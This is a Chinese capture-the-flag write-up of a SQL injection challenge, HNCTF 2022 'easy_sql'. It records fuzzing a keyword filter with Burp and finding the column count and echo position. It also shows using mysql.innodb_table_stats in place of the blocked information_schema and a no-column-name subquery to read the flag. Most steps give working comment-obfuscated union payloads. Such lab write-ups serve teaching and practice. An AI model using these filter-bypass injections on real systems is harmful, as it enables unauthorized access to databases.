## 基本信息

* 题目名称： [HNCTF 2022 WEEK2]easy_sql
* 题目链接： https://www.nssctf.cn/problem/2952
* 考点清单： sql注入，无列名注入
* 工具清单： burp,sqlmap
* payloads： 无

## 一、看到什么

**题目关键信息列表**：

1. 题目给了一个`id`查询的入口


## 二、想到什么解题思路

1. 用`sqlmap`直接跑一下
2. 跑不通，考虑存在`WAF`，使用`burp`看一下哪些关键词被过滤

## 三、尝试过程和结果记录

**尝试过程：**

1. Sqlmap无法得到结果，考虑存在`WAF`。
2. 使用常见的s`ql`关键词字典进行`burp`注入，发现确实存在`WAF`。
    - `id`为1时，正常显示结果。
    - `id`设置为`union`时，提示【姓名不存在，或账号密码错误】
    - `id`设置为`information`时，提示`error`，都是字符串，但是结果不同，说明存在WAF。图中响应长度为`530`的都是被过滤的。空格和`order`，`and` 等等这些都被过滤了。
    ![](images/[HNCTF%202022%20WEEK2]easy_sql-waf.png)

3. 发现输入一些字符串的时候，`id`也能正常失败，虽然提示【姓名不存在，或账号密码错误】，说明是字符型注入。发现3不报错，4开始报错，确认列数为3。
    ```
    # 正常
    1'/**/group/**/by/**/3,'1
    # error
    1'/**/group/**/by/**/4,'1
    ```

4. 确定回显位置。显示3，说明3的位置是回显位。
    ```
    1'/**/union/**/select/**/1,2,3/**/'1
    ```
5. 查看数据库。爆出数据库为`ctf`
    ```
    1'/**/union/**/select/**/1,2,database()/**/'1 
    ```
6. 接下来查看表名,可以看到数据库有多个数据表。

    ```
    # 正常语句爆表名的时候，出现error,是因为information被过滤了。
    1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/'1 

    # 换成mysql.innodb_table_stats,但是这个时候就是查询所有数据库里的所有表，没有表和数据库的关系。
    1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/'1
    ```
    ![](images/[HNCTF%202022%20WEEK2]easy_sql-table.png)

7. 接下来就需要找到`flag`这个表所在的数据库。

    ```
    1'/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/table_name="flag"'
    ```
    ![](images/[HNCTF%202022%20WEEK2]easy_sql-database.png)
    

8. 现在就需要查询这个表里写`flag`的列。发现就得到了`flag`。

    ```
    1'/**/union/**/select/**/1,2,`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/'1
    ```
    - `select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag` 最终的结果会包含一个 1 和 flag 表中的所有列。
    - `xxx` 是给这个子查询取的别名，用来标识这个子查询,是 SQL 语法的一部分。
    - `1`作用是查询 子查询（虚拟表）的第一列。


## 四、总结与反思

1. `sqlmap`跑不通的，就表明存在`WAF`，需要使用`burp`来`fuzz`看一下哪些关键词被过滤。
2. 可以根据注入类型来简单模拟写一个题目的查询语句，将自己的注入语句拼接其中，看是否能正常组成指令来检查自己语句错误。

